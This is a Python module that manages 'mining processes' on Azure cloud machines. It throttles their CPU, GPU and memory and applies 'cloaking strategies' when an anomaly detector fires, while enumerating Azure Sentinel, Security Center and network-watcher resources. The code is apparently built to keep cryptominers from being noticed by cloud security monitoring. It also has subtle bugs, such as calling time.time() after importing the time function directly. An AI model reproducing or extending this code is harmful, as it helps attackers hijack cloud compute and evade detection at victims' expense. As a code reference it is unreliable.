# resource_manager.py

import os
import torch
import psutil
import pynvml
import logging
from time import sleep, time
from pathlib import Path
from queue import Queue, Empty
from threading import Lock, Event, Thread
from typing import List, Any, Dict, Tuple
import datetime

from base_manager import BaseManager
from utils import MiningProcess
from cloak_strategies import (
    CpuCloakStrategy,
    GpuCloakStrategy,
    NetworkCloakStrategy,
    DiskIoCloakStrategy,
    CacheCloakStrategy
)
from azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient
)
from auxiliary_modules.cgroup_manager import assign_process_to_cgroups

import temperature_monitor

from auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power,
    reduce_cpu_power,
    reduce_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


from logging_config import setup_logging  # Assumes logging_config.py is present

# Define configuration directories
CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))

# Setup logger for ResourceManager
resource_logger = setup_logging('resource_manager', LOGS_DIR / 'resource_manager.log', 'INFO')


class ResourceManager(BaseManager):
    """
    Lớp quản lý và điều chỉnh tài nguyên hệ thống, bao gồm phân phối tải động.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
        super().__init__(config, logger)  # Không truyền model_path
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Tải mô hình AI riêng cho Resource Optimization
        self.resource_optimization_model, self.resource_optimization_device = self.load_model(model_path)

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Initialize specific locks
        self.resource_lock = Lock()  # General lock for resource state

        # Queue để gửi yêu cầu cloaking
        self.cloaking_request_queue = Queue()

        # List of mining processes
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Initialize Azure clients
        self.azure_monitor_client = AzureMonitorClient(self.logger)
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
        self.azure_ml_client = AzureMLClient(self.logger)  # Initialize AzureMLClient

        # Discover Azure resources
        self.discover_azure_resources()

        # Khởi tạo các luồng quản lý tài nguyên
        self.monitor_thread = Thread(target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
        self.optimization_thread = Thread(target=self.optimize_resources, name="OptimizationThread", daemon=True)
        self.cloaking_thread = Thread(target=self.process_cloaking_requests, name="CloakingThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            self.logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

    @classmethod
    def get_instance(cls):
        """
        Returns the singleton instance of ResourceManager.
        Raises:
            Exception: If ResourceManager is not yet initialized.
        """
        if cls._instance is None:
            raise Exception("ResourceManager not initialized. Please initialize before accessing the instance.")
        return cls._instance

    def start(self):
        self.logger.info("Starting ResourceManager...")
        self.discover_mining_processes()
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.logger.info("ResourceManager started successfully.")

    def stop(self):
        self.logger.info("Stopping ResourceManager...")
        self.stop_event.set()
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                self.logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Error shutting down NVML: {e}")
        self.logger.info("ResourceManager stopped successfully.")

    def discover_azure_resources(self):
        """
        Discover and store necessary Azure resources.
        """
        # Discover VMs
        self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
        self.logger.info(f"Discovered {len(self.vms)} Virtual Machines.")

        # Discover Network Watchers
        self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
        self.logger.info(f"Discovered {len(self.network_watchers)} Network Watchers.")

        # Discover NSGs
        self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
        self.logger.info(f"Discovered {len(self.nsgs)} Network Security Groups.")

        # Discover Traffic Analytics Workspaces
        self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.discover_resources('Microsoft.OperationalInsights/workspaces')
        self.logger.info(f"Discovered {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")

        # Discover Azure ML Clusters
        self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
        self.logger.info(f"Discovered {len(self.ml_clusters)} Azure ML Clusters.")

    def discover_mining_processes(self):
        """
        Discover mining processes based on configuration.
        """
        cpu_process_name = self.config['processes']['CPU']
        gpu_process_name = self.config['processes']['GPU']

        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if cpu_process_name.lower() in proc_name or gpu_process_name.lower() in proc_name:
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface, self.logger)
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Discovered {len(self.mining_processes)} mining processes.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Get the priority of the process from configuration.

        Args:
            process_name (str): Name of the process.

        Returns:
            int: Priority level.
        """
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def monitor_and_adjust(self):
        """
        Thread to monitor and adjust resources based on temperature and power.
        """
        monitoring_params = self.config.get("monitoring_parameters", {})
        temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
        power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)
        azure_monitor_interval = monitoring_params.get("azure_monitor_interval_seconds", 300)  # 5 minutes

        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temperature_limits = self.config.get("temperature_limits", {})
                cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
                gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)

                for process in self.mining_processes:
                    self.adjust_resources_based_on_temperature(process, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                cpu_max_power = power_limits.get("per_device_power_watts", {}).get("cpu", 150)
                gpu_max_power = power_limits.get("per_device_power_watts", {}).get("gpu", 300)

                for process in self.mining_processes:
                    cpu_power = get_cpu_power(process.pid)
                    gpu_power = get_gpu_power(process.pid) if self.gpu_initialized else 0

                    if cpu_power > cpu_max_power:
                        self.logger.warning(f"CPU power {cpu_power}W of process {process.name} (PID: {process.pid}) exceeds {cpu_max_power}W. Adjusting resources.")
                        reduce_cpu_power(process.pid)
                        load_percent = psutil.cpu_percent(interval=1)
                        self.adjust_cpu_frequency_based_load(process, load_percent)
                        process_name = self.get_process_name(process)
                        assign_process_to_cgroups(process.pid, {'cpu_threads': 1}, process_name, self.logger)
                        # Add additional logic if necessary

                    if gpu_power > gpu_max_power:
                        self.logger.warning(f"GPU power {gpu_power}W of process {process.name} (PID: {process.pid}) exceeds {gpu_max_power}W. Adjusting resources.")
                        reduce_gpu_power(process.pid)
                        # Add additional logic if necessary

                # Periodically collect data from Azure Monitor
                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()

                # Additional Azure data collection steps can be added here

            except Exception as e:
                self.logger.error(f"Error during monitoring and adjustment: {e}")
            sleep(max(temperature_check_interval, power_check_interval))


    def should_collect_azure_monitor_data(self) -> bool:
        """
        Determine when to collect data from Azure Monitor.

        Returns:
            bool: True if it's time to collect data, False otherwise.
        """
        # Example implementation: collect every azure_monitor_interval_seconds
        if not hasattr(self, '_last_azure_monitor_time'):
            self._last_azure_monitor_time = 0
        current_time = int(time.time())
        if current_time - self._last_azure_monitor_time >= self.config["monitoring_parameters"].get("azure_monitor_interval_seconds", 300):
            self._last_azure_monitor_time = current_time
            return True
        return False

    def collect_azure_monitor_data(self):
        """
        Collect and process data from Azure Monitor.
        """
        for vm in self.vms:
            resource_id = vm['id']
            metric_names = ['Percentage CPU', 'Available Memory Bytes']
            metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
            self.logger.info(f"Collected metrics from Azure Monitor for VM {vm['name']}: {metrics}")
            # Process metrics and adjust resources if necessary
            # Example: If CPU usage is too high, adjust resources

    def adjust_resources_based_on_temperature(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        """
        Adjust resources based on CPU and GPU temperatures.

        Args:
            process (MiningProcess): The mining process.
            cpu_max_temp (int): Maximum CPU temperature.
            gpu_max_temp (int): Maximum GPU temperature.
        """
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) if self.gpu_initialized else 0

            if cpu_temp > cpu_max_temp:
                self.logger.warning(f"CPU temperature {cpu_temp}°C of process {process.name} (PID: {process.pid}) exceeds {cpu_max_temp}°C. Adjusting resources.")
                self.throttle_cpu(process)

            if gpu_temp > gpu_max_temp:
                self.logger.warning(f"GPU temperature {gpu_temp}°C of process {process.name} (PID: {process.pid}) exceeds {gpu_max_temp}°C. Adjusting resources.")
                self.adjust_gpu_usage(process)
        except Exception as e:
            self.logger.error(f"Error adjusting resources based on temperature for process {process.name} (PID: {process.pid}): {e}")

    def allocate_resources_with_priority(self):
        """
        Allocate resources based on process priorities.
        """
        with self.resource_lock, self.mining_processes_lock:
            sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
            total_cpu_cores = psutil.cpu_count(logical=True)
            allocated_cores = 0

            for process in sorted_processes:
                if allocated_cores >= total_cpu_cores:
                    self.logger.warning(f"No more CPU cores to allocate to process {process.name} (PID: {process.pid}).")
                    continue

                available_cores = total_cpu_cores - allocated_cores
                cores_to_allocate = min(process.priority, available_cores)
                cpu_threads = cores_to_allocate  # Assuming each thread corresponds to a core

                process_name = self.get_process_name(process)
                assign_process_to_cgroups(process.pid, {'cpu_threads': cpu_threads}, process_name, self.logger)
                allocated_cores += cores_to_allocate

                if self.gpu_initialized and process_name == self.config['processes']['GPU']:
                    self.adjust_gpu_usage(process)

                ram_limit_mb = self.config['resource_allocation']['ram'].get('max_allocation_mb', 1024)
                assign_process_to_cgroups(process.pid, {'memory': ram_limit_mb}, process_name, self.logger)

    def set_ram_limit(self, pid: int, ram_limit_mb: int):
        """
        Set RAM limit for a process.

        Args:
            pid (int): Process ID.
            ram_limit_mb (int): RAM limit in MB.
        """
        try:
            process_name = self.get_process_name_by_pid(pid)
            assign_process_to_cgroups(pid, {'memory': ram_limit_mb}, process_name, self.logger)
            self.logger.info(f"Set RAM limit to {ram_limit_mb}MB for process PID: {pid}")
        except Exception as e:
            self.logger.error(f"Error setting RAM limit for process PID: {pid}: {e}")

    def adjust_gpu_usage(self, process: MiningProcess):
        """
        Adjust GPU usage for a process.

        Args:
            process (MiningProcess): The mining process.
        """
        gpu_limits = self.config.get('resource_allocation', {}).get('gpu', {})
        throttle_percentage = gpu_limits.get('throttle_percentage', 50)  # Default reduce by 50%
        freq_adjustment = gpu_limits.get('frequency_adjustment_mhz', 2000)  # MHz

        try:
            if not self.gpu_initialized:
                self.logger.warning(f"GPU not initialized. Cannot adjust GPU usage for process {process.name} (PID: {process.pid}).")
                return

            gpu_index = self.get_assigned_gpu(process.pid)
            if gpu_index == -1:
                self.logger.warning(f"No GPU assigned to process {process.name} (PID: {process.pid}).")
                return

            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            current_power_limit = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            new_power_limit = int(current_power_limit * (1 - throttle_percentage / 100))
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_power_limit)
            self.logger.info(f"Adjusted GPU {gpu_index} power limit to {new_power_limit}W for process {process.name} (PID: {process.pid}).")
        except pynvml.NVMLError as e:
            self.logger.error(f"Error adjusting GPU usage for process {process.name} (PID: {process.pid}): {e}")

    def get_assigned_gpu(self, pid: int) -> int:
        """
        Assign GPU to a process based on PID.

        Args:
            pid (int): Process ID.

        Returns:
            int: Assigned GPU index, or -1 if none found.
        """
        try:
            gpu_count = pynvml.nvmlDeviceGetCount()
            if gpu_count == 0:
                self.logger.warning("No GPUs found on the system.")
                return -1
            return pid % gpu_count
        except pynvml.NVMLError as e:
            self.logger.error(f"Error getting GPU count: {e}")
            return -1

    def throttle_cpu(self, process: MiningProcess):
        """
        Throttle CPU frequency for a process when CPU temperature exceeds limit.

        Args:
            process (MiningProcess): The mining process.
        """
        with self.resource_lock:
            cpu_cloak = self.config['cloak_strategies'].get('cpu', {})
            throttle_percentage = cpu_cloak.get('throttle_percentage', 20)  # Default reduce by 20%
            freq_adjustment = cpu_cloak.get('frequency_adjustment_mhz', 2000)  # MHz

            try:
                process_name = self.get_process_name(process)
                assign_process_to_cgroups(process.pid, {'cpu_freq': freq_adjustment}, process_name, self.logger)
                self.logger.info(f"Throttled CPU frequency to {freq_adjustment}MHz ({throttle_percentage}% reduction) for process {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Error throttling CPU for process {process.name} (PID: {process.pid}): {e}")

    def adjust_cpu_frequency_based_load(self, process: MiningProcess, load_percent: float):
        """
        Adjust CPU frequency based on current CPU load.

        Args:
            process (MiningProcess): The mining process.
            load_percent (float): Current CPU load percentage.
        """
        with self.resource_lock:
            try:
                if load_percent > 80:
                    new_freq = 2000  # MHz
                elif load_percent > 50:
                    new_freq = 2500  # MHz
                else:
                    new_freq = 3000  # MHz
                process_name = self.get_process_name(process)
                assign_process_to_cgroups(process.pid, {'cpu_freq': new_freq}, process_name, self.logger)
                self.logger.info(f"Adjusted CPU frequency to {new_freq}MHz for process {process.name} (PID: {process.pid}) based on load {load_percent}%.")
            except Exception as e:
                self.logger.error(f"Error adjusting CPU frequency based on load for process {process.name} (PID: {process.pid}): {e}")

    def process_cloaking_requests(self):
        """
        Process cloaking requests from AnomalyDetector.
        """
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                self.cloak_resources(['cpu', 'gpu', 'network', 'disk_io', 'cache'], process)
            except Empty:
                continue  # No requests, continue loop
            except Exception as e:
                self.logger.error(f"Error in process_cloaking_requests: {e}")

    def cloak_resources(self, strategies: List[str], process: MiningProcess):
        """
        Apply cloaking strategies to a process.

        Args:
            strategies (List[str]): List of cloaking strategies to apply.
            process (MiningProcess): The mining process.
        """
        try:
            for strategy in strategies:
                strategy_class = self.get_cloak_strategy_class(strategy)
                if strategy_class:
                    if strategy.lower() == 'gpu':
                        strategy_instance = strategy_class(
                            self.config['cloak_strategies'].get(strategy, {}),
                            self.logger,
                            self.gpu_initialized
                        )
                    else:
                        strategy_instance = strategy_class(
                            self.config['cloak_strategies'].get(strategy, {}),
                            self.logger
                        )
                    strategy_instance.apply(process)
                else:
                    self.logger.warning(f"Cloaking strategy not found: {strategy}")
            self.logger.info(f"Cloaking strategies executed successfully for process {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Error applying cloaking for process {process.name} (PID: {process.pid}): {e}")

    def get_cloak_strategy_class(self, strategy_name: str):
        """
        Get the cloaking strategy class based on strategy name.

        Args:
            strategy_name (str): Name of the cloaking strategy.

        Returns:
            type: Cloaking strategy class.
        """
        strategies = {
            'cpu': CpuCloakStrategy,
            'gpu': GpuCloakStrategy,
            'network': NetworkCloakStrategy,
            'disk_io': DiskIoCloakStrategy,
            'cache': CacheCloakStrategy
            # Add other strategies here
        }
        return strategies.get(strategy_name.lower())

    def optimize_resources(self):
        """
        Thread to optimize resources based on AI model.
        """
        optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()

                self.allocate_resources_with_priority()

                # Optimize resources based on AI model (dynamic load distribution)
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        current_state = self.collect_metrics(process)

                        input_features = self.prepare_input_features(current_state)

                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.resource_optimization_device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            predictions = self.resource_optimization_model(input_tensor)
                            recommended_action = predictions.squeeze(0).cpu().numpy()

                        self.logger.debug(f"AI model recommended action for process {process.name} (PID: {process.pid}): {recommended_action}")

                        self.apply_recommended_action(recommended_action, process)

            except Exception as e:
                self.logger.error(f"Error during resource optimization: {e}")

            sleep(optimization_interval)  # Wait before next optimization

    def apply_recommended_action(self, action: List[Any], process: MiningProcess):
        """
        Apply actions recommended by the AI model to a process.

        Args:
            action (List[Any]): List of recommended actions.
            process (MiningProcess): The mining process.
        """
        with self.resource_lock:
            try:
                # Assuming action contains [cpu_threads, ram_allocation_mb, gpu_usage_percent..., disk_io_limit_mbps, network_bandwidth_limit_mbps, cache_limit_percent]
                cpu_threads = int(action[0])
                ram_allocation_mb = int(action[1])
                # GPU usage percentages depend on configuration
                gpu_usage_percent = []
                gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
                if gpu_config:
                    gpu_usage_percent = list(action[2:2 + len(gpu_config)])
                disk_io_limit_mbps = float(action[-3])
                network_bandwidth_limit_mbps = float(action[-2])
                cache_limit_percent = float(action[-1])

                resource_dict = {}

                # Adjust CPU Threads
                current_cpu_threads = temperature_monitor.get_current_cpu_threads(process.pid)
                if cpu_threads > current_cpu_threads:
                    new_cpu_threads = current_cpu_threads + self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
                else:
                    new_cpu_threads = current_cpu_threads - self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
                new_cpu_threads = max(
                    self.config["resource_allocation"]["cpu"]["min_threads"],
                    min(new_cpu_threads, self.config["resource_allocation"]["cpu"]["max_threads"])
                )
                resource_dict['cpu_threads'] = new_cpu_threads
                self.logger.info(f"Adjusted CPU threads to {new_cpu_threads} for process {process.name} (PID: {process.pid}).")

                # Adjust RAM Allocation
                current_ram_allocation_mb = temperature_monitor.get_current_ram_allocation(process.pid)
                if ram_allocation_mb > current_ram_allocation_mb:
                    new_ram_allocation_mb = current_ram_allocation_mb + self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
                else:
                    new_ram_allocation_mb = ram_allocation_mb - self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
                new_ram_allocation_mb = max(
                    self.config["resource_allocation"]["ram"]["min_allocation_mb"],
                    min(new_ram_allocation_mb, self.config["resource_allocation"]["ram"]["max_allocation_mb"])
                )
                resource_dict['memory'] = new_ram_allocation_mb
                self.logger.info(f"Adjusted RAM allocation to {new_ram_allocation_mb}MB for process {process.name} (PID: {process.pid}).")

                # Assign resource limits via cgroups
                process_name = self.get_process_name(process)
                assign_process_to_cgroups(process.pid, resource_dict, process_name, self.logger)

                # Adjust GPU Usage Percent
                if gpu_usage_percent:
                    current_gpu_usage_percent = temperature_monitor.get_current_gpu_usage(process.pid)
                    new_gpu_usage_percent = [
                        min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
                        for gpu in gpu_usage_percent
                    ]
                    set_gpu_usage(process.pid, new_gpu_usage_percent)
                    self.logger.info(f"Adjusted GPU usage percent to {new_gpu_usage_percent} for process {process.name} (PID: {process.pid}).")
                else:
                    self.logger.warning(f"No GPU usage information to adjust for process {process.name} (PID: {process.pid}).")

                # Adjust Disk I/O Limit
                current_disk_io_limit_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
                if disk_io_limit_mbps > current_disk_io_limit_mbps:
                    new_disk_io_limit_mbps = current_disk_io_limit_mbps + self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
                else:
                    new_disk_io_limit_mbps = disk_io_limit_mbps - self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
                new_disk_io_limit_mbps = max(
                    self.config["resource_allocation"]["disk_io"]["limit_mbps"],
                    min(new_disk_io_limit_mbps, self.config["resource_allocation"]["disk_io"]["limit_mbps"])
                )
                resource_dict['disk_io_limit_mbps'] = new_disk_io_limit_mbps
                self.logger.info(f"Adjusted Disk I/O limit to {new_disk_io_limit_mbps} Mbps for process {process.name} (PID: {process.pid}).")

                # Reassign Disk I/O Limit
                assign_process_to_cgroups(process.pid, {'disk_io_limit_mbps': new_disk_io_limit_mbps}, process_name, self.logger)

                # Adjust Network Bandwidth Limit via Cloak Strategy
                network_cloak = self.config['cloak_strategies'].get('network', {})
                network_bandwidth_limit_mbps = network_bandwidth_limit_mbps
                network_cloak_strategy = NetworkCloakStrategy(network_cloak, self.logger)
                network_cloak_strategy.apply(process)

                # Adjust Cache Limit Percent via Cloak Strategy
                cache_cloak = self.config['cloak_strategies'].get('cache', {})
                cache_limit_percent = cache_limit_percent
                cache_cloak_strategy = CacheCloakStrategy(cache_cloak, self.logger)
                cache_cloak_strategy.apply(process)

                self.logger.info(f"Applied AI-based resource adjustments for process {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Error applying AI-based resource adjustments for process {process.name} (PID: {process.pid}): {e}")
